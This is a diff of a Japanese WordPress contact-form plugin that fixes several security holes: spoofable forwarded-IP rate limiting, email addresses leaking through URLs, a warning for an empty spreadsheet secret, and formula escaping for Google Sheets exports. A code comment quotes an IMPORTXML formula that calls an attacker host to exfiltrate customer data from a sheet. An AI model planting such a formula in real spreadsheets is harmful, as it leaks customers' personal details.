@@ -2,7 +2,7 @@
 /**
  * Plugin Name: e.Amber お問い合わせフォーム
  * Description: 電気工事の問い合わせフォーム。工事内容を選ぶと、その内容に合わせた質問に切り替わるステップ型フォームです。受付内容はDBに保存され、受付完了メールを自動返信＋担当者に通知します。入力項目は1つずつ「必須／任意／非表示」を選べます。ショートコード [eamber_form] をページに貼るだけ。
- * Version: 1.8.0
+ * Version: 1.8.1
  * Author: 株式会社Keys
  * License: GPLv2 or later
  * Text Domain: eamber-form
@@ -15,7 +15,7 @@
 
 if (!defined('ABSPATH')) exit; // 直接アクセス禁止
 
-define('EAF_VER', '1.8.0');
+define('EAF_VER', '1.8.1');
 define('EAF_OPT', 'eamber_form_options');
 
 /**
@@ -901,14 +901,23 @@ function eaf_hex_to_rgb($hex) {
 /** 送信元IP。CDN配下で全員が同一IP扱いになるのを避けるため標準ヘッダを優先する。
  *  偽装可能だが、本命の防御はメールアドレス単位の制限（爆撃したい宛先は固定のため）。 */
 function eaf_client_ip() {
-    foreach (array('HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR') as $h) {
-        if (!empty($_SERVER[$h])) {
-            $parts = explode(',', $_SERVER[$h]);
-            $ip = trim($parts[0]);
-            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
+    $remote = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
+    /* ★X-Forwarded-For などの見出しは、送信者が自分で好きな値を名乗れる。
+       これを無条件に信じると、毎回ちがうIPを名乗るだけで
+       「同一IPは1時間に5件」の制限が完全に素通りになる。
+       CloudflareやリバースプロキシのFF内側にあると分かっている場合だけ、
+       wp-config.php に define('EAF_TRUST_PROXY', true); を書いて有効にする。 */
+    $trust = defined('EAF_TRUST_PROXY') && EAF_TRUST_PROXY;
+    if (apply_filters('eaf_trust_proxy', $trust)) {
+        foreach (array('HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR') as $h) {
+            if (!empty($_SERVER[$h])) {
+                $parts = explode(',', $_SERVER[$h]);
+                $ip = trim($parts[0]);
+                if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
+            }
         }
     }
-    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
+    return $remote;
 }
 
 function eaf_rate_ok($bucket, $id, $limit, $window) {
@@ -981,7 +990,13 @@ function eaf_name_not_japanese($name) {
 
 /**
  * CSVインジェクション対策。= + - @ 等で始まるセルは Excel が数式として実行してしまうため、
- * 先頭に ' を付けて無害な文字列にする（お客様の自由入力がそのままCSVに入るため必須）。
+ * 先頭に ' を付けて無害な文字列にする。
+ *
+ * ★CSVだけでなく、Googleスプレッドシートへの転記にも必ず通すこと。
+ *   Googleは = で始まるセルを数式として実行するため、
+ *   =IMPORTXML("https://攻撃者/?x="&A1&B1,"//a") のような値を送りつけられると、
+ *   担当者がシートを開いた瞬間に、同じシートに並んでいる他のお客様の
+ *   氏名・電話・住所が外部へ送られてしまう。
  * 数値（-5 等）はそのまま通す。
  */
 function eaf_csv_safe($s) {
@@ -1149,7 +1164,10 @@ function eaf_test_mail() {
     delete_option('eaf_last_mail_error');
     $ok = wp_mail($to, '[テスト] ' . eaf_mail_subject(), eaf_mail_body($ctx), $headers);
     if ($ok) delete_option('eaf_last_mail_error');
-    wp_safe_redirect(admin_url('admin.php?page=eamber-form&testmail=' . ($ok ? '1' : '0') . '&to=' . rawurlencode($to)));
+    /* ★宛先はURLに載せない。ブラウザの履歴・サーバーのアクセスログ・
+       リファラに残り、お客様のアドレスを試したときにそこへ写る。 */
+    update_option('eaf_last_test_to', $to, false);
+    wp_safe_redirect(admin_url('admin.php?page=eamber-form&testmail=' . ($ok ? '1' : '0')));
     exit;
 }
 
@@ -1216,7 +1234,7 @@ function eaf_settings_page() {
         <h1>電気工事反響フォーム 設定</h1>
         <?php if (isset($_GET['testmail'])) {
             $tm_ok = ($_GET['testmail'] === '1');
-            $tm_to = isset($_GET['to']) ? sanitize_email(wp_unslash($_GET['to'])) : '';
+            $tm_to = (string) get_option('eaf_last_test_to', '');
             echo '<div class="notice notice-' . ($tm_ok ? 'success' : 'error') . '"><p>' .
                 ($tm_ok
                     ? 'テストメールを <strong>' . esc_html($tm_to) . '</strong> に送信しました。届かない場合は<strong>迷惑メールフォルダ</strong>も確認してください（届かない＝SPF/DKIM未設定の可能性大）。'
@@ -1633,6 +1651,12 @@ function eaf_settings_page() {
                 <tr><th>転記先のURL</th><td>
                     <input type="url" name="<?php echo EAF_OPT; ?>[sheet_url]" value="<?php echo esc_attr(eaf_opt('sheet_url')); ?>" size="70" placeholder="https://script.google.com/macros/s/.../exec">
                     <p class="description">スクリプトを「ウェブアプリ」として公開したときに出るURL（末尾が <code>/exec</code>）。</p>
+<?php if (eaf_flag('sheet_on', false) && eaf_opt('sheet_url') !== '' && eaf_opt('sheet_secret') === ''): ?>
+                    <p class="description" style="color:#b32d2e"><strong>合言葉が空のままです。</strong>
+                        ウェブアプリのURLは「アクセスできるユーザー：全員」で公開されるため、
+                        合言葉が無いと<strong>URLを知った人は誰でもこのスプレッドシートに行を書き込めます</strong>。
+                        推測されにくい文字列を入れて、スクリプトを貼り直してください。</p>
+<?php endif; ?>
 <?php if (eaf_opt('sheet_url') && !eaf_sheet_url_ok(eaf_opt('sheet_url'))): ?>
                     <p class="description" style="color:#b32d2e"><strong>このURLの形では届きません。</strong>
                         <code>https://script.google.com/macros/s/……/exec</code> の形（末尾が <code>/exec</code>）である必要があります。<br>
@@ -3133,25 +3157,30 @@ function eaf_sheet_ready() {
 function eaf_sheet_payload($r) {
     $r = (array) $r;
     $pt = isset($r['ptype']) ? $r['ptype'] : '';
+    /* ★お客様の入力がそのままスプレッドシートのセルになる。
+       数式として実行されないように、必ず1枚かませてから積む。 */
+    $v = function ($k) use ($r) {
+        return isset($r[$k]) ? eaf_csv_safe($r[$k]) : '';
+    };
     return array(
         'secret'     => (string) eaf_opt('sheet_secret', ''),
         'id'         => isset($r['id']) ? (int) $r['id'] : 0,
         'created_at' => isset($r['created_at']) ? $r['created_at'] : '',
         'ptype'      => isset($GLOBALS['EAF_PTYPE_LABEL'][$pt]) ? $GLOBALS['EAF_PTYPE_LABEL'][$pt] : $pt,
-        'address'    => isset($r['address']) ? $r['address'] : '',
-        'address_detail' => isset($r['address_detail']) ? $r['address_detail'] : '',
-        'company'    => isset($r['company']) ? $r['company'] : '',
-        'name'       => isset($r['name']) ? $r['name'] : '',
-        'kana'       => isset($r['kana']) ? $r['kana'] : '',
-        'tel'        => isset($r['tel']) ? $r['tel'] : '',
-        'email'      => isset($r['email']) ? $r['email'] : '',
-        'contact_time' => isset($r['contact_time']) ? $r['contact_time'] : '',
-        'building'   => isset($r['building']) ? $r['building'] : '',
-        'ownership'  => isset($r['ownership']) ? $r['ownership'] : '',
-        'timing'     => isset($r['timing']) ? $r['timing'] : '',
-        'detail'     => isset($r['detail']) ? $r['detail'] : '',
-        'details'    => isset($r['details']) ? $r['details'] : '',
-        'page_url'   => isset($r['page_url']) ? $r['page_url'] : '',
+        'address'        => $v('address'),
+        'address_detail' => $v('address_detail'),
+        'company'      => $v('company'),
+        'name'         => $v('name'),
+        'kana'         => $v('kana'),
+        'tel'          => $v('tel'),
+        'email'        => $v('email'),
+        'contact_time' => $v('contact_time'),
+        'building'     => $v('building'),
+        'ownership'    => $v('ownership'),
+        'timing'       => $v('timing'),
+        'detail'       => $v('detail'),
+        'details'      => $v('details'),
+        'page_url'     => $v('page_url'),
     );
 }
 
